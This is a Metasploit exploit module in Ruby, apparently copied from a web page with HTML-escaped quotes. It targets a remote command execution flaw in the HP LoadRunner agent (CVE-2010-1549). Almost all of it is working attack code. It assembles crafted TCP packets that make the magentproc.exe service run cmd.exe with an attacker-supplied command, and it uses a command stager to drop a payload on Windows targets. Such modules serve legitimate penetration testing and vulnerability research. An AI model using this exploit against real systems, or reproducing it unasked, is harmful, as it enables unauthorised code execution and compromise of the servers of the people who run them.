# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "HP Mercury LoadRunner Agent magentproc.exe Remote Command Execution",
      &#039;Description&#039;    => %q{
        This module exploits a remote command execution vulnerablity in HP LoadRunner before 9.50
        and also HP Performance Center before 9.50. HP LoadRunner 12.53 and other versions are
        also most likely vulneable if the (non-default) SSL option is turned off.
        By sending a specially crafted packet, an attacker can execute commands remotely.
        The service is vulnerable provided the Secure Channel feature is disabled (default).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Unknown&#039;, # Original discovery # From Tenable Network Security
          &#039;aushack&#039;  # metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2010-1549&#039;],
          [&#039;ZDI&#039;, &#039;10-080&#039;],
          [&#039;BID&#039;, &#039;39965&#039;],
          [&#039;URL&#039;, &#039;https://support.hpe.com/hpsc/doc/public/display?docId=c00912968&#039;]
        ],
      &#039;Payload&#039;        => { &#039;BadChars&#039; => "\x0d\x0a\x00" },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          # Note: software reportedly supports Linux - may also be vulnerable.
          [&#039;Windows (Dropper)&#039;,
          &#039;Platform&#039;   => &#039;win&#039;,
          &#039;Arch&#039;       => [ARCH_X86, ARCH_X64]
          ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;Stance&#039;         => Msf::Exploit::Stance::Aggressive,
      &#039;DisclosureDate&#039; => &#039;May 06 2010&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options([Opt::RPORT(54345)])
  end

  def autofilter
    true
  end

  def execute_command(cmd, _opts = {})
    guid = Rex::Text.encode_base64(Rex::Text.rand_text_alphanumeric(17))
    randstr = Rex::Text.rand_text_alpha(16)
    server_name = Rex::Text.rand_text_alpha(7)
    server_ip = datastore[&#039;LHOST&#039;]
    server_port = Rex::Text.rand_text_numeric(4)
    # If linux is one day supported, cmd1 = /bin/sh and cmd2 = -c cmd
    cmd1 = "C:\\Windows\\system32\\cmd.exe"
    cmd2 = "/C \"#{cmd}\""

    pkt1 = [0x19].pack(&#039;N&#039;) + guid + &#039;0&#039;

    pkt2 = [0x6].pack(&#039;N&#039;) + [0x0].pack(&#039;N&#039;) + "(-server_type=8)(-server_name=#{server_name})(-server_full_name=#{server_name})"
    pkt2 << "(-server_ip_name=#{server_ip})(-server_port=#{server_port})(-server_fd_secondary=4)(-guid_identifier=#{guid})\x00\x00"
    pkt2 << [0x7530].pack(&#039;N&#039;)

    pkt3 = [4 + pkt2.length].pack(&#039;N&#039;) + pkt2

    pkt4 = [0x1c].pack(&#039;N&#039;) + [0x05].pack(&#039;N&#039;) + [0x01].pack(&#039;N&#039;) + randstr + pkt3

    pkt5 = [pkt4.length].pack(&#039;N&#039;) + pkt4

    pkt6 = [0x437].pack(&#039;N&#039;) + [0x0].pack(&#039;N&#039;) + [0x31].pack(&#039;N&#039;) + [1].pack(&#039;N&#039;) + [0x31000000].pack(&#039;N&#039;)
    pkt6 << [cmd1.length].pack(&#039;N&#039;) + cmd1 + "\x00" + [cmd2.length].pack(&#039;N&#039;) + cmd2 + [0x0].pack(&#039;N&#039;) + [0x0].pack(&#039;N&#039;)

    pkt7 = [4 + pkt6.length].pack(&#039;N&#039;) + pkt6

    pkt8 = [0x18].pack(&#039;N&#039;) + [0x04].pack(&#039;N&#039;) + randstr + pkt7

    pkt9 = [pkt8.length].pack(&#039;N&#039;) + pkt8

    sploit = pkt1 + pkt5 + pkt9

    connect
    sock.put(sploit)
    disconnect
 end

  def exploit
      print_status(&#039;Sending payload...&#039;)
      execute_cmdstager(linemax: 1500)
  end
end

